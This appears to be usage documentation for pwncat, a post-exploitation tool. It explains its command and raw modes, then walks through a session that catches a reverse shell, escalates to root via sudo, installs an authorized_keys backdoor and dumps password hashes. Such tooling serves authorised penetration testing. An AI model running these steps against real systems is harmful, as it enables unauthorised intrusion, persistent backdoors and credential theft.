Basic Usage
===========

``pwncat`` has two main modes which it operates in: Command Mode and Raw Mode. In command mode,
you are given a prompt with the ``(local)`` prefix. This prompt provides access to ``pwncat`` commands
for everything from file upload/download to automated privilege escalation. In command mode, you
control the remote host over the same communications channel, and therefore cancelling local commands
with "C-c" may leave your raw prompt in a precarious state.

The local prompt is governed by a command parser based on Python's ``prompt_toolkit`` module. It
will syntax highlight and tab-complete commands and arguments, and provides extensive help which
is auto-generated from the docstrings within the code itself.

In raw mode, ``pwncat`` disables echoing on your local terminal and places it in raw mode. Each
individual keystroke is forwarded to the remote terminal. This allows you to interact with the remote
terminal as if you were logged in locally or over SSH. Things like keyboard shortcuts, escape sequences
and graphical terminal applications will behave normally.

Transitioning between these two modes is accomplished internally by changing the ``pwncat.victim.state``
property. This property is a Python ``Enum`` object. From a user perspective, this state can be toggled
between Raw and Command mode with the "C-d" key sequence. The reason for selecting "C-d" is two-fold.
Firstly, "C-d" is a common way to exit a shell. Intercepting this control sequence prevents you from
habitually pressing this key combination and accidentally exiting your remote shell. Further, because
of it's common function, it feels natural to use this combination to switch between (or temporarily exit)
the different states.

You might be wondering "great, but how do I send a 'C-d' to the remote process!?" Well, ``pwncat``
allows this through the use of the defined prefix key. Similar to terminal applications like ``tmux``,
``pwncat`` has the concept of a "prefix" key. This key is pressed prior to entering a defined keyboard
shortcut to tell the input processor to interpret the next keystroke differently. In ``pwncat``, the
default prefix is "C-k". This means that to send the "C-d" sequence to the remote terminal, you can
press "C-k C-d" and to send "C-k" to the remote terminal, you can press "C-k C-k". Keyboard shortcuts
can be connected with any arbitrary script or local command and can be defined in the configuration file
or with the ``bind`` command.

Connecting to a remote host
---------------------------

To connect to a remote host, the ``connect`` command is used. This command is capable of connecting
to a remote host over a raw socket, SSH or view a previously installed persistence mechanism. It
is also able to listen for reverse connections and initiate a session upon connection.

When running ``pwncat``, all program arguments with the exception of the ``--config/-c`` and the
``--help`` arguments are interpreted as local commands which will be executed after the configuration
file is loaded.

Connecting can happen in your configuration file, from the command identified at command execution
or after startup. If no connection is made from the configuration file or from your command line
arguments, you will be placed in a local ``pwncat`` command prompt. This is a restricted prompt
only allowing local commands to be run. From here, you can start a listener or connect to a remote
host with the ``connect`` command.

Here's an example of connecting to a remote bind shell on the host "test-host" on port 4444 immediately
on invocation of ``pwncat``:

.. code-block:: bash

    pwncat connect --connect -H test-host -p 4444

Similarly, listening for a reverse shell connection can be similarly accomplished:

.. code-block:: bash

    pwncat connect --listen -H 0.0.0.0 -p 4444

As mentioned above, if no connections are made during initialization, you will be taken to a local
``pwncat`` prompt where you can then execute the ``connect`` command manually:

.. code-block:: bash

    $ pwncat
    [?] no connection established, entering command mode

    [+] local terminal restored
    (local) pwncat$ connect -c -H test-host -p 4444
    [+] connection to A.B.C.D:4444 established
    [+] setting terminal prompt
    [+] running in /bin/bash
    [+] terminal state synchronized
    [+] pwncat is ready 🐈

    (remote) debian@debian-s-1vcpu-1gb-nyc1-01:/home/debian$

The last method of connecting is via your configuration file. You can place the ``connect`` command
there in order to not require any arguments. More powerfully, you can place your **reconnect**
command in your configuration file, which will fail the first time you connect to the remote host.
After installing persistence, reconnection will utilize your persistence to gain a shell and you
will no longer need command line parameters.

.. code-block:: bash

    # your pwncat configuration script
    set db "sqlite:///pwncat.sqlite"
    connect --reconnect -H test-host

.. code-block:: bash

    # Connect to test-host via reverse shell the first time
    $ pwncat -c pwncatrc connect -l -H 0.0.0. -p 4444
    [!] d87b9646813d250ac433decdee70112a: connection failed: no working persistence methods found
    [+] connection to A.B.C.D:4444 established
    [+] setting terminal prompt
    [+] running in /bin/bash
    [+] terminal state synchronized
    [+] pwncat is ready 🐈

    (remote) debian@debian-s-1vcpu-1gb-nyc1-01:/root$
    [+] local terminal restored
    (local) pwncat$ privesc -e
    [+] privilege escalation succeeded using:
     ⮡ shell as root via /bin/bash (sudo NOPASSWD)
    [+] pwncat is ready 🐈

    (remote) root@debian-s-1vcpu-1gb-nyc1-01:~#
    [+] local terminal restored
    (local) pwncat$ persist -i -m authorized_keys -u root
    (local) pwncat$ persist --status
     - authorized_keys as root (local) installed
    (local) pwncat$
    [+] pwncat is ready 🐈

    (remote) root@debian-s-1vcpu-1gb-nyc1-01:~#

    exit
    (remote) debian@debian-s-1vcpu-1gb-nyc1-01:/root$
    (remote) debian@debian-s-1vcpu-1gb-nyc1-01:/root$

    exit

    [+] local terminal restored

    $ pwncat -c data/pwncatrc
    [+] setting terminal prompt
    [+] running in /bin/bash
    [+] terminal state synchronized
    [+] pwncat is ready 🐈
    (remote) root@debian-s-1vcpu-1gb-nyc1-01:~#
    (remote) root@debian-s-1vcpu-1gb-nyc1-01:~#
    [+] local terminal restored
    (local) pwncat$ hashdump
    root:$6$jmqmNYe9$8GJjU.tV5XWfyFMclJXd0f7TOCEuHbvU9ajD8ZeaVd7y7GGXcb7BfNVV6rR/S6AcmI0W.yzHiXId0EZsYgnQx1
    debian:$6$c5h8DDIk$2bxaEK8C.wCkTwY.z/Z4c48RwdLRL5AE5J6qvPPHCz2vPb2dEeIbwtxkTHHbvTcnh1S/J0e2gPxUiRgT9SiXN/
    (local) pwncat$

The first time ``pwncat`` was run, the reconnection command failed. This was expected, since we
had not connected to the remote host yet. After we escalated privileges, and installed persistence,
we were able to re-run ``pwncat`` with no arguments and get a shell. In this case, ``pwncat``
utilized our installed ssh authorized keys backdoor to gain a session as the root user.